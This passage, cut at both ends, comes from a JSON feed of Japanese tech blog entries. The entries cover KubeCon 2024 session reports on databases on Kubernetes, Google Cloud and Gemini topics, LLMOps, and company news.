まっているマネージドデータベースが、Kubernetesを利用することから目を背けさせてしまう要因になっていると感じます。しかしDBAがより求められるのはデータベースをセルフホストする場合で、今後DBAとして活躍していくにはLinuxに適応してきたようにKubernetesに適応していく日強うがあると考えています。DBaaSの将来はどのように変わっていくと考えるか？将来のDBaaSは、Kubernetesとの統合がさらに深まり、データベースとKubernetesの境界が曖昧になっていくと予測されています。PostgreSQLの例では、Kubernetesとの親和性を高めるためのパッチ適用や、拡張機能のコンテナ化などが進んでいます。また、プライベートDBaaSだけでなく、商用DBaaSのKubernetes上での提供も増加し、データベースサービスの利用がさらに容易になると考えられます。Google Cloudなどのクラウドプロバイダーも、将来的にKubernetes上でマネージドデータベースサービスを提供する可能性があり、これにより、数千規模のデータベース管理が容易になるでしょう。Kubernetesの普及と成熟に伴い、Helm ChartやYAML以外の、より洗練されたUXも期待されます。セッション内ではGoogle CloudではCloud SQLがKubenetes1で運用される未来があるかもしれないと言及していましたが、すでにSpannerはKubernetesで動いています。商用DBaaSがKubernetesで動くことについてはよくある構成ですが、プライベートDBaaSがKubernetes上で動き、さまざまなエコシステムと組み合わせてAPIベースなど自動化に適したUXが提供されていくことには非常に注目しています。まとめ「The Future of DBaaS on Kubernetes」セッションは、Kubernetes上でのデータベース運用が成熟期を迎えていることを示しました。ストレージとネットワーキングの進化、Operatorの普及、そして様々な企業での成功事例は、Kubernetesがデータベース運用のための堅牢でスケーラブルなプラットフォームであることを証明しています。クラウドネイティブなアプローチ、セルフサービス化、セキュリティ強化、そして適切なアーキテクチャ設計は、Kubernetes上でのデータベース運用を成功させるための鍵となります。同時に、VM環境からの移行、リソース管理、人材育成といった課題にも適切に対処する必要があります。今後のDBaaSは、Kubernetesとの統合がさらに進み、データベースサービスの利用がより容易になると期待されます。このセッションで得られた知見は、今後のデータベース運用戦略策定に役立つ貴重な情報源となるでしょう。特に、オンプレミスでマイクロサービスアーキテクチャを採用する組織にとって、Kubernetesはデータベース運用における重要な選択肢となるでしょう。↩","isoDate":"2024-12-08T03:00:00.000Z","dateMiliSeconds":1733626800000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2024: When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/11/when_life_gives_you_containers_make_an_open_source_rds_a_kubernetes_love_story","contentSnippet":"この記事は以下アドベントカレンダー11日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconaセッション動画:https://www.youtube.com/watch?v=0gSSmdNB-Zoこのセッションは、オープンソースRDS、あるいはオープンソースDBaaSをKubernetes上で構築・運用する道のりを、物語風に語っています。セッションを通して、Kubernetes上でデータベースを運用することへの不安や課題を解消し、そのメリットと可能性を提示することを目指していると感じました。なぜKubernetesでデータベースを動かすのか？セッション冒頭では、スピーカーが4年前はKubernetesでデータベースを動かすことに懐疑的だったものの、現在は大きく考えが変わっていることが語られています。その理由として、クラウドニュートラル戦略、コスト削減、そして自動化の3点が挙げられています。特に自動化は、高可用性構成、Blue/Greenデプロイ、フェイルオーバーなどを容易にする点で重要です。これらのメリットは、マイクロサービスアーキテクチャやクラウドネイティブ開発において、データベース運用を効率化し、DevOps実践を促進する上で大きな力となります。従来の運用では、データベースのデプロイや管理に多くの手作業が必要でしたが、Kubernetesと自動化ツールを組み合わせることで、これらの作業を大幅に簡素化し、開発スピードの向上に貢献できます。一方、Kubernetes上でのデータベース運用に対する懸念として、パフォーマンスの劣化、Kubernetes自体の成熟度、そして複雑さが挙げられています。これらの懸念は、データベースエンジニアとして当然抱くものであり、セッション全体を通してこれらの懸念への回答が提示されています。このセクションでは、Kubernetes上でデータベースを運用する上でのメリットと課題が明確に示されており、導入を検討する上で重要なポイントが提示されています。特に、クラウドネイティブな環境におけるデータベース運用の重要性が強調されていました。また単純なメリット・デメリット以上にユーザーの感情面にフォーカスしているところが印象的でした。Chapter 1: Enthusiasm and Kubernetes 101: Kubernetesの基本と進化この章では、Kubernetes上でデータベースを動かすための基本的なステップが段階的に示されています。Pod、Persistent Volume Claim (PVC)、Service、Secret、ConfigMap、StatefulSet、そしてHA構成のためのエージェントとProxyの導入といった流れは、Kubernetesにおけるデータベース運用の進化を理解する上で非常に有用です。特に、StatefulSetの導入は、データベースのようなステートフルアプリケーションの運用において大きな進歩です。Podの順序付けられたデプロイ、安定したネットワークID、永続ストレージへのアクセスなど、StatefulSetが提供する機能は、データベースの高可用性と安定運用に不可欠です。しかし、これらの構成要素を手作業で管理することは複雑でエラーを起こしやすいため、IaCの導入が推奨されています。IaCを用いることで、インフラストラクチャのコード化、自動化、バージョン管理が可能となり、再現性と信頼性の高いデプロイを実現できます。TerraformやAnsible、ArgoCD、HelmなどのIaCツールは、Kubernetesの構成管理を簡素化し、複数環境へのデプロイを容易にします。これは、DevOpsの原則である「Infrastructure as Code」を実践する上で非常に重要なステップです。この章では、Kubernetes上でデータベースを動かすための基本的な構成要素と、IaCの重要性が説明されています。IaCを用いることで、複雑なKubernetes環境を効率的に管理し、再現性と信頼性を向上させることができる点が強調されていました。またIaCのパラメータを変更することで複数環境をデプロイできるところからDBaaSの最初の一歩を踏み出したととらえることができました。Chapter 2: Disillusionment and Operators 101: OperatorによるDay 2 Operationの簡素化IaCによってデプロイは容易になりますが、運用、つまりDay 2 Operationは依然として複雑です。アップグレード、スケーリング、フェイルオーバー、バックアップ、モニタリング、メンテナンス、リカバリといったタスクは、手作業で行うと大きな負担となります。ここでOperatorが登場します。Operatorは、Kubernetesの拡張機能であり、特定のアプリケーションのデプロイと管理を自動化します。データベースOperatorは、データベースのライフサイクル全体を管理し、Day 2 Operationを大幅に簡素化します。Operatorの導入により、データベース管理者はKubernetesの内部構造を深く理解する必要がなくなり、データベース運用に集中できます。これは、運用コストの削減と効率性の向上に大きく貢献します。また、Operatorは宣言的な設定をサポートしており、運用作業の自動化と標準化を促進します。しかし、Operatorだけでは真のDBaaSとは言えません。セルフサービスポータル、マルチクラスタ対応、詳細なモニタリング、課金機能など、DBaaSに必要な機能は多岐に渡ります。この章では、OperatorがDay 2 Operationを簡素化する上で重要な役割を果たすことが説明されています。Operatorは、データベース管理者の負担を軽減し、運用効率を向上させる強力なツールです。これはデータベースエンジニアといわれるロールが採用市場に少ない日本では特に重要な点です。大規模なデータベース運用に合わせてデータベースエンジニアの採用を増やすことは難しいため、様々なツールを利用して負荷を下げ、省力化し、より本質的な業務を行う必要があるためです。一方でOperatorだけではDBaaSの全てをカバーできない点にも注意が必要です。Chapter 3: Hope and DBaaS: Percona Everestの紹介Percona Everestは、オープンソースのDBaaSソリューションであり、Kubernetes上でデータベースサービスを提供します。ReactとMaterial UIで構築された直感的なUI、Golangで実装されたバックエンド、そしてAPIによるアクセスを提供することで、ユーザーフレンドリーな操作性を実現しています。Everestのアーキテクチャは、複数のOperatorをOperator Managerで管理する構造を採用しています。これにより、Operatorのバージョン管理、依存関係の解決、相互運用性の確保が容易になります。ユーザーは、GUIまたはAPIを介してデータベースサービスを操作し、そのリクエストはEverest Operatorによって各データベースOperatorに変換されます。Everestは、オープンソースDBaaSとして、ベンダーロックインを回避し、柔軟なデータベース運用を可能にします。また、コミュニティベースの開発により、迅速な機能追加とバグ修正が期待できます。この章では、Percona EverestがオープンソースDBaaSとして、Kubernetes上でデータベースサービスを提供する仕組みが説明されています。Everestは、ユーザーフレンドリーなUI、Operator ManagerによるOperator管理、そしてオープンソースとしてのメリットを提供することで、柔軟で効率的なデータベース運用を支援します。セッション中ではGUIやAPIは利用しない導入例もあると話されており、個人的にはKubernetesリソースの管理に余計なUIを追加する方法は大規模化したときにデメリットが増えるのではないかと感じました。またこのセッションのスピーカーはPerconaのエンジニアであるためある程度ポジショントークが含まれているであろうことも注意が必要です。Epilogue: Kubernetesとデータベースの未来セッションの締めくくりとして、Kubernetes上でのデータベース運用は困難な側面もあるものの、OperatorやDBaaSソリューションの活用により、効率的でスケーラブルな運用が可能になることが強調されています。Kubernetes上でデータベースを運用することは、もはや一部の先進的な企業だけの選択肢ではなく、一般的な選択肢になりつつあります。クラウドネイティブな環境でデータベースを運用することは、ビジネスの俊敏性と競争力を高める上で重要な要素となります。Kubernetes上でのデータベース運用に対する不安や懸念を解消し、その可能性を示す上で非常に有益な内容でした。Percona EverestのようなオープンソースDBaaSソリューションの登場は、Kubernetesにおけるデータベース運用の楽にする選択肢の一つと言えるでしょう。まとめこのセッションを通して、Kubernetes上でのデータベース運用は、進化を続け、成熟しつつあることが理解できました。初期の懸念は解消されつつあり、OperatorやDBaaSソリューションの登場により、運用効率とスケーラビリティが大幅に向上しています。特に定型的なデプロイと運用を自動化できることでデータベースエンジニアはアプリケーション特性に応じた最適化やリリースマネジメントといったユーザーに価値を提供することを最大化することに注力することができます。今後、Kubernetes上でのデータベース運用はさらに普及し、クラウドネイティブなアプリケーション開発の中核を担うことになるでしょう。一定以上の規模の組織ではオンプレ回帰やクラウドコストの最小化といった観点からKubernetes上にデータベースをホストするソリューションが求められ生ます。そのためデータベースエンジニアは、Kubernetesの基礎知識を習得し、OperatorやDBaaSソリューションの活用方法を学ぶことで、より効率的で本質的な業務を遂行できるようになるはずです。","isoDate":"2024-12-08T02:42:58.000Z","dateMiliSeconds":1733625778000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"バッチ処理をCloud RunからCloud Run jobsに変更してみた話","link":"https://qiita.com/bayobayo0324/items/71f7e19a051261d1adfc","contentSnippet":"この記事は3-shake Advent Calendar 2024 シリーズ1の8日目の記事ですはじめましてあるいはこんにちは、@bayobayo0324 です。株式会社スリーシェイクでクラウド型ETLツール「Reckoner（レコナー）」のプロダクトエンジニアしていま...","isoDate":"2024-12-07T22:06:20.000Z","dateMiliSeconds":1733609180000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"私とJagu\'e\'rと2025年から...","link":"https://blog.masasuzu.net/entry/2024/12/08/000000","contentSnippet":"この記事はJagu\'e\'r Advent Calendar 2024の8日目の記事です。日付的には大遅刻です。特に技術的な話はしません。思い出話とこれからの意気込みを書きます。Jagu\'e\'r(Japan Google Cloud Usergroup for Enterprise) は、Google Cloudのユーザー企業やパートナー企業が集まるユーザー会です。私はパートナー企業であるスリーシェイクに所属し、Jagu\'e\'rに参加しています。実は入会自体は結構前で、メールを遡ると2023年8月10日でした。当時Google Cloudに関わる案件が始まり、情報収集のために登録した記憶があります。しかし、「Enterprise」や「分科会」といった言葉から、何となく堅苦しいイメージを抱いてしまい、Slackには入ったものの、あまり活動には参加していませんでした。転機が訪れたのは、今年2024年の春から夏頃のこと。同僚が分科会の運営に入り、別の同僚もJagu\'e\'rのMeetupで発表するようになったんです。身近な人が関わるようになると、自然と興味が湧いてきて、今年の後半はオンライン・オフライン問わず、Meetupに参加するようになりました。そして先日、Jagu\'e\'r Park \'24 Winter!に参加しました。そこで行われたJagu\'e\'r Award選出のためのピッチ発表に、私は深く感銘を受けました。どの発表者の方も、Jagu\'e\'rコミュニティへの熱い思いや感謝の気持ちが溢れていて、本当に心を動かされました。特に、中外製薬の方とDatadogの方のピッチは強く印象に残っています。これまでJagu\'e\'rコミュニティに深く関わってきませんでしたが、こんなにも熱い思いを持つ人たちと一緒に活動したい！という気持ちが湧き上がってきました。「善は急げ」と、ピッチを聞いたその場で、社内でJagu\'e\'rの分科会運営に携わっている人に連絡を取り、運営を手伝えないか相談しました。さらに懇親会では、弊社担当のGoogle Cloudパートナーエンジニアの方にも相談し、同じ分科会の運営の方につなげてもらいました。問題がなければ、来年から某分科会の運営に携わる予定です。正直なところ、勢いで走り出した部分もあるので、まだ何ができるか、何をしていきたいかは漠然としています。それでも、来年はコミュニティの活性化に貢献できるような成果を残せるよう、精一杯頑張りたいと思っています。","isoDate":"2024-12-07T15:00:00.000Z","dateMiliSeconds":1733583600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Lima+containerd+nerdctlで作るコンテナ環境/lima_containerd_nerdctl","link":"https://speakerdeck.com/moz_sec_/lima-containerd-nerdctl-1","contentSnippet":"","isoDate":"2024-12-07T05:00:00.000Z","dateMiliSeconds":1733547600000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"セキュアな LLM アプリ開発：OWASP Top 10 for LLM 2025 と Vertex AI による実践","link":"https://zenn.dev/kimitsu/articles/owasp-for-llm-2025-and-vertex-ai","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 7 日目の記事です。 はじめにOWASP Top 10 for LLM Applications の 2025 年版が 11 月 18 日に発表されました。[1]OWASP Top 10 は Web アプリケーションのセキュリティリスクの中で最も重要な 10 個をリスト化したものであり、OWASP Top 10 for LLM Applications は名前の通り LLM を利用したアプリケーションに関するものです。本家は数年に一度の改訂ですが、こちらは LLM の技術進歩が早いためほぼ毎年...","isoDate":"2024-12-07T00:14:53.000Z","dateMiliSeconds":1733530493000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"CUDAを利用したプログラムの高速化とNvidia Container Toolkit","link":"https://sreake.com/blog/cuda-nvidia-container-toolkit/","contentSnippet":"はじめに Sreake事業部インターン生の高島陸斗です。インターン生としてSRE技術の調査・検証を行っています。私は、情報系の大学院生で、普段は数値解析に関する研究をしています。学部時代は、今回のブログ内容とも関係する並 […]The post CUDAを利用したプログラムの高速化とNvidia Container Toolkit first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-06T01:51:20.000Z","dateMiliSeconds":1733449880000,"authorName":"Sreake","authorId":"Sreake"},{"title":"「SRE Kaigi 2025」にスリーシェイクのエンジニアが登壇","link":"https://sreake.com/blog/sre_kaigi_2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に在籍するエンジニアが、2025年1月26日（日）に開催される「SRE Kaigi 2025」にセッション登壇することをお知らせします。The post 「SRE Kaigi 2025」にスリーシェイクのエンジニアが登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-05T01:00:00.000Z","dateMiliSeconds":1733360400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"argocd コマンドで別ブランチとの差分を確認する","link":"https://qiita.com/yteraoka/items/aea03d50288375f85183","contentSnippet":"ArgoCD の GitOps で Merge 前に manifest の差分を見たいArgoCD は Application リソースで source に指定した Git などの定義と実際に Kubernetes クラスタにデプロイされている manifest の差分...","isoDate":"2024-12-03T15:14:17.000Z","dateMiliSeconds":1733238857000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"LLMのモデル更新や廃止による影響を考える","link":"https://shu-kob.hateblo.jp/entry/2024/12/03/232856","contentSnippet":"この記事は、MLOps（LLMOps、生成AIOps） Advent Calendar 2024 4日目の記事です。生成AIの普及により、アプリケーションに組み込んで実運用を始めた方も増えてきたと思います。LLMOpsをする中で気をつけたいことを考えてみました。モデルの更新まず、思い浮かぶのがモデルの更新よる影響です。モデルの更新によって性能が上がるなどのメリットを享受できる反面、挙動変更によって、困ることもあります。私の場合、システムの実運用では無いですが、LLM技術書のサンプルコードが動かなくなる事態がありました。06_agent/agent_5.py で2回目の実行結果が正しく表示されません \xb7 Issue #3 \xb7 harukaxq/langchain-book \xb7 GitHubgpt-3.5-turboをAgentとして使用したときの挙動が変わったという内容です。アプリに組み込んでいたら、機能が使えなくなる可能性があり、使えなくなった場合の代替案も用意しておく必要があると考えました。また、LLMのリリース情報もウォッチしておく必要があるでしょう。Geminiはリリースの最新情報を日本語で提供しています。gemini.google.comChatGPTはリリースノートを英語のみですが提供しています。ChatGPT — Release Notes | OpenAI Help CenterAnthropic製品（Claude）のリリースノートは日本語で提供されています。docs.anthropic.comモデルの廃止モデルの廃止もウォッチする必要があるでしょう。GPT-3.5 Turbo終了はニュースになりました。xtech.nikkei.com↑日経クロステックの有料会員記事ですが、会員でなくても1ページ目で内容は把握できます。learn.microsoft.comAzure OpenAIでは、GPTの各種マイナーバージョンが提供されていますが、適宜廃止になるので注意が必要です。廃止になる場合、モデルのVersion UPが必要なので、早めに開発環境でVersion UPしたモデルの挙動確認をする必要があるでしょう。Version UPしたモデルだと、LLMの利用料が高くなることも念頭に置いて、コスト試算しましょう。まとめモデル更新や廃止を早く知るために、LLM公式サイトのリリースノートなどのウォッチをして、早めに対策をしましょう。","isoDate":"2024-12-03T14:28:56.000Z","dateMiliSeconds":1733236136000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Transformer論文を生成AIで要約してみた","link":"https://shu-kob.hateblo.jp/entry/2024/12/02/233507","contentSnippet":"この記事は生成AI Advent Calendar 2024の3日目の記事です。AIの歴史は60年ほどで、「冬の時代」と呼ばれる停滞期もありましたが、昨今の生成AIの発展は「Transformer」と呼ばれる論文から始まりました。この「Transformer」論文をわかりやすいように生成AIに要約させてみました。arxiv.org「Transformer」論文は上記サイトで見ることができます。論文の正式名称は「Attention Is All You Need」で、現在 v7。右側のAccess Paper:から閲覧することができます。なお、PDFの直リンクはこちらGoogle CloudのVertex AIでGeminiに要約させた結果は以下です。プロンプト「この論文を日本語で高校3年生レベルにもわかるように要約してください。」この論文は、「Transformer」という、機械翻訳などのシーケンス変換タスクに革新をもたらした新しいニューラルネットワークアーキテクチャを提案しています。高校3年生にもわかるように要約すると、以下のようになります。従来の機械翻訳の問題点:従来の機械翻訳は、RNN（再帰型ニューラルネットワーク）という技術を主に使っていました。RNNは文章を単語ごとに順番に処理していくため、長い文章だと処理に時間がかかります。また、並列処理が難しいため、計算速度を上げるのが困難でした。Transformerの革新的な点:Transformerは、「Attention（注意機構）」という仕組みに完全に基づいており、RNNのような順番に処理する仕組みを完全に排除しました。Attention機構は、翻訳したい単語を生成する際に、入力文全体の中でどの単語に注目すべきかを判断する仕組みです。人間の翻訳作業で例えると、翻訳する際に原文の関連する部分に注目するのと同じような働きをします。この仕組みにより、以下の利点が生まれました。並列処理が可能: 単語を順番に処理する必要がないため、並列処理が可能になり、計算速度が大幅に向上しました。長い文章への対応力向上: RNNでは、文章が長くなるほど精度が落ちやすいという問題がありましたが、Attention機構は入力文全体を一度に見ることができるため、長い文章でも高い精度を維持できます。Transformerの成果:Transformerは、従来のモデルよりも高い精度を達成し、さらに学習時間も大幅に短縮しました。具体的には、英語からドイツ語への翻訳と英語からフランス語への翻訳タスクで、当時の最高精度を更新しました。Transformerの仕組みを簡単に説明すると:Transformerは、エンコーダとデコーダという2つの部分から構成されています。エンコーダ: 入力文を解析し、各単語の意味をベクトル表現に変換します。デコーダ: エンコーダの出力とAttention機構を利用して、翻訳文を生成します。エンコーダとデコーダは、それぞれ複数の層が積み重なった構造になっています。各層は、Attention機構と全結合層という2つのサブ層から構成されています。Transformerの今後の展望:Transformerは、テキスト以外のデータ（画像、音声、動画など）にも応用できる可能性があり、様々な分野での活用が期待されています。また、文章生成をより効率的に行うための研究も進められています。簡単に言うと、Transformerは、人間の「注意」の仕組みに似た仕組みを使って、従来よりも高速で高精度な機械翻訳を実現した画期的な技術です。","isoDate":"2024-12-02T14:35:07.000Z","dateMiliSeconds":1733150107000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2025年の崖から考える我々のパーパス（序章）","link":"https://shu-kob.hateblo.jp/entry/2024/12/01/232229","contentSnippet":"はじめにこの記事は3-shake Advent Calendar 2024 シリーズ1の2日目の記事です。1日目はシリーズ1がYutaro ShirayamaさんのポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する2日目はシリーズ2がYoshinori Teraokaさんのvector で kubernetes の container log を CloudWatch Logs に転送するでした。なお、シリーズ2の2日目はshingo919さんの 九州旅行記（ドライブでの九州一週旅行は大変だった！）です。2025年の崖今回は「2025年の崖」について軽くご紹介したいと思います。いよいよ2025年になりますが、ITでは「2025年の崖」という言葉が存在します。2025年の崖がある中で、スリーシェイクのSreake事業部が果たす役割を考えていきたいと思います。「2025年の崖」をググったら色々出てきますが、経済産業省のレポートが1次情報源的かつわかりやすいでしょう。www.meti.go.jpなお、DXレポート ～ITシステム「2025年の崖」の克服とDXの本格的な展開～（サマリー）はスライド5枚にまとまっており、さっと読みやすいです。「2025年の崖」は要するに何なのかというと、IT人材が不足しており、レガシーシステムを保守するのに限界が来ている。DXも推進しないといけない。何とかしないともう後が無い。という状況。2015年時点で、IT人材の不足が約17万人とされていたところ、2025年には約43万人にまで上ります。既存のレガシーシステムの保守がブラックボックス、属人的になっており、DX化の足枷に → デジタル競争の敗者に技術的負債が溜まる一方保守運用の担い手不足で、サイバーセキュリティ事故が起きやすくこんな厳しい状況を打破するには、ユーザとベンダーそれぞれで対策していく必要があります。ユーザは人材・資金を保守からDXにシフトベンダーも同様に人材・資金を保守からDXにシフトベンダーはAI、アジャイル、マイクロサービス等最新技術を用いたビジネスにシフトやることはわかっていても、そう簡単にはいきません。ただし、スリーシェイクのSreake事業では、内製化支援も行っており、これまで数々の企業様の支援を行ってまいりました。Sreakeという商材は難しく、入社して1年が経った私もストンと腹落ちできる説明ができないままでしたが、「2025年の崖」をどう克服するかが我々のパーパスだと感じました。私は生成AIアプリケーション開発支援というDXを担当しておりますが、案件の推進を通して、「DX推進」を語れるようになっていきたいと思います。今回は、序章のような形で今後も2025年の崖について書いていければと思います。次の3-shake Advent Calendar 2024はシリーズ1がkechigonさんの「Google Cloud monitoringのアラートをGitHub issueに通知する」シリーズ2がtryu___さんの「kubebuilder使ってpodの監視してみた」です。","isoDate":"2024-12-01T14:22:29.000Z","dateMiliSeconds":1733062949000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"vector で kubernetes の container log を CloudWatch Logs に転送する","link":"https://qiita.com/yteraoka/items/df0777cdcb403a7af750","contentSnippet":"Vector とはvector は timber とともに買収され datadog がメンテナンスしているオープンソースプロジェクトのようです。(Datadog acquires Timber Technologies)A lightweight, ultra-fas...","isoDate":"2024-12-01T12:20:46.000Z","dateMiliSeconds":1733055646000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Geminiのビジネス利用でのメリットを語る","link":"https://shu-kob.hateblo.jp/entry/2024/11/30/233039","contentSnippet":"この記事はGCP(Google Cloud Platform) Advent Calendar 2024 1日目の記事です。2024年はIT業界にとって、最も話題に上がったトピックは生成AIだったのではないでしょうか？2023年までは生成AIと家は、ChatGPTでしたが、2024年はGoogleがBardをリブランディングして、Gemini（ジェミニ）とし、しのぎを削っています。私はGoogle Cloudのパートナー企業である株式会社スリーシェイク Sreake事業部にて、Geminiを用いた生成AIアプリケーション開発に携わっており、Geminiのビジネス利用でのメリットを語りたいと思います。Gemini-1.5-Proは最大200万トークンの読み込みが可能Geminiの強みの中で、最も他の生成AIモデルと差別化できているのが、トークン数の長さです。これにより、動画解析などへの利用もしやすくなりました。Geminiはマルチモーダルなので、音声、画像、動画なども処理可能です。量の目安としては以下になります。書籍15〜20冊程度の分量動画約2時間音声約22時間BigQueryで容易にデータ分析基盤を構築可能他のクラウドには同様のサービスがなく、同じ機能を実現するためには複数のサービスを組み合わせる必要があります。AzureやAWS、オンプレのデータはそのままで読み込みだけ行う機能もあります。今お使いのシステム構成はほぼ変えず、追加構築可能となります。Geminiは他のモデルと比較してトークンあたりの利用料が安いGoogle Cloud上で稼働させるのに最適化しているためです。他社のクラウドで使える生成AIモデルは別会社のものなので、クラウドも生成AIもGoogleのGeminiによって、この点も強みです！もしもGeminiの出力結果が著作権侵害で係争が発生してもGoogle Cloudがサポート他クラウドにはないサービスです。こちらも、クラウドも生成AIも会社が揃っている強みと言えるでしょう。真実性1位！Gemini 1.5 ProがNIKKEI Digital Governanceが調査した真実性のスコアで1位となりました！以下の記事は最初日経で見れていたと思うのですが、今はNIKKEI Digital Governanceに登録しないと見れないようです。博識のGoogle､主観強いMeta　生成AIの｢真実性｣を検証上記画像は下記記事から引用させていただきました。note.com2024年もあと少し。2025年もGeminiとともに生成AIを盛り上げていきたいと思います！GCP(Google Cloud Platform) Advent Calendar 2024 次の記事はknak72さんによる企業のセキュリティ強化に！ Chrome Enterprise Premium のURLフィルタリングとマルウェアスキャン機能です。","isoDate":"2024-11-30T14:30:39.000Z","dateMiliSeconds":1732977039000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイク、Google Cloud Japan の「 Google Cloud Partner Top Engineer 2025 」にて3名のエンジニアが受賞","link":"https://sreake.com/blog/%e3%82%b9%e3%83%aa%e3%83%bc%e3%82%b7%e3%82%a7%e3%82%a4%e3%82%af%e3%80%81google-cloud-japan-%e3%81%ae%e3%80%8c-google-cloud-partner-top-engineer-2025-%e3%80%8d%e3%81%ab%e3%81%a63%e5%90%8d%e3%81%ae/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）のエンジニア3名が、Google Cloud Japan が高い技術力を持ったエンジニアを表彰するプログラムである「 Google Cloud Partner Top Engineer 2025 」に選出されたことをお知らせします。The post スリーシェイク、Google Cloud Japan の「 Google Cloud Partner Top Engineer 2025 」にて3名のエンジニアが受賞 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-28T06:03:47.000Z","dateMiliSeconds":1732773827000,"authorName":"Sreake","authorId":"Sreake"},{"title":"3-shake における組織的な Google Cloud Partner Top Engineer 推進について","link":"https://sreake.com/blog/google-cloud-partner-top-engineer-2025/","contentSnippet":"はじめに 3-shakeで、Engineering Team Lead / SRE をやっている横尾（@866mfs）です 今回、3-shake では、佐藤 慧太(@SatohJohn), 横尾 杏之介(@866mfs) […]The post 3-shake における組織的な Google Cloud Partner Top Engineer 推進について first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-28T06:00:00.000Z","dateMiliSeconds":1732773600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"コミュニティ紹介: Kubernetes Meetup Novice","link":"https://speakerdeck.com/bells17/komiyuniteishao-jie-kubernetes-meetup-novice","contentSnippet":"Cloud Native Days Winter 2024のCommunity & Beginner LTでお話した資料です。\\r\\rhttps://pfem.notion.site/CNDW2024-Community-Beginner-LT-13821b0141e0800cb403c880cb4d2738","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"bells17","authorId":"bells17"},{"title":"メインテーマはKubernetes","link":"https://speakerdeck.com/nwiizo/meintemahakubernetes","contentSnippet":"2024年16:20-17:00（Track A）にて「メインテーマはKubernetes」というタイトルで登壇します。\\r\\rイベント名: Cloud Native Days Winter 2024\\r\\r公式URL:https://event.cloudnativedays.jp/cndw2024/\\r\\rセッションURL:https://event.cloudnativedays.jp/cndw2024/talks/2373","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"KubeCon + Cloud NativeCon North America 参加レポート","link":"https://sreake.com/blog/kubecon-cloud-nativecon-north-america-2024-report/","contentSnippet":"はじめに こんにちは！3-shak inc, で SRE をやっている横尾(@866mfs)です。 2024/11/12 ~ 2024/11/15 に開催された、\xa0KubeCon + CloudNativeCo […]The post KubeCon + Cloud NativeCon North America 参加レポート first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-27T00:28:01.000Z","dateMiliSeconds":1732667281000,"authorName":"Sreake","authorId":"Sreake"},{"title":"社内活動の取り組み紹介~ スリーシェイクでこんな取り組みしてます ~","link":"https://speakerdeck.com/bells17/she-nei-huo-dong-noqu-rizu-mishao-jie-surisieikudekonnaqu-rizu-misitemasu","contentSnippet":"CloudNative Days Winter 2024 船上LT会 小さな一歩、大きな飛躍〜クラウドネイティブを継続する〜 で発表したLT資料です。\\rhttps://cloudnativedays.connpass.com/event/334620/","isoDate":"2024-11-26T05:00:00.000Z","dateMiliSeconds":1732597200000,"authorName":"bells17","authorId":"bells17"},{"title":"[S3 Intelligent-Tiering]概要とTerraformでの実装","link":"https://zenn.dev/takehiro1111/articles/s3_intelligent_tiering","contentSnippet":"0.本記事を書いている経緯業務でS3周りのコスト削減の一環としてS3 Intelligent-Tierringの設定を行う予定だが、その前段階で導入に必要なコストや懸念点を調査している。その過程で自身の備忘録として残しています。 1.概要(参照) 1-1.設定する目的S3に関連するコスト削減を行いたいため。どのオブジェクトがどの程度使用されるか判断がつかない状態で、安易にライフサイクルポリシーでGracierへ移行したり出来ないため、AWS側でアクセスパターンを検知し、オブジェクトを最適な階層へ移行してくれる。 1-2.機能Amazon S3 のストレ...","isoDate":"2024-11-24T07:24:48.000Z","dateMiliSeconds":1732433088000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Reckoner における Datadog Browser Test の活用事例 / Datadog Browser Test at Reckoner","link":"https://speakerdeck.com/nomadblacky/datadog-browser-test-at-reckoner","contentSnippet":"Japan Datadog User Group Meetup#6\\rhttps://datadog-jp.connpass.com/event/334594/","isoDate":"2024-11-20T05:00:00.000Z","dateMiliSeconds":1732078800000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"プロンプトエンジニアリングハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/11/19/172452","contentSnippet":"genai-users.connpass.com↑上記勉強会の資料です。shu-kob.hateblo.jp↑こちらの記事の「プロンプトエンジニアリング」もご覧ください。（上記記事はChatGPT）先ずは復習してみましょうGeminiにアクセスgemini.google.comお好みで、ChatGPTやClaudeを使用しても構いません。プロンプトエンジニアリングJSON形式で出力カレーのレシピを教えてください。出力は以下のJSON形式にしてください。==============={  \\"材料\\": [\\"材料1\\", \\"材料2\\"],  \\"手順\\": [\\"手順1\\", \\"手順2\\"]}==============={  \\"材料\\": [    